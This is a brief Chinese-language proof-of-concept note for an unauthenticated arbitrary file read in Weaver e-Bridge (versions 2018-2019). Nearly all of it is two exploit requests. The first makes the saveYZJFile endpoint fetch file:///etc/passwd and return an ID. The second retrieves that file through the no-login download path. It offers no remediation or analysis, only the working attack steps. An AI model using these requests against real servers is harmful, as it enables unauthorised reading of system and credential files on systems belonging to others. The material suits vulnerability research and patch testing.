# 泛微云桥 e-Bridge任意文件读取

影响版本：
- 2018-2019

poc
```
1、得到ID值
/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt

2、构造get请求获取文件内容
/file/fileNoLogin/8e2558b16851455285ebf95c3e8e1184
```


[@雷石实验室]()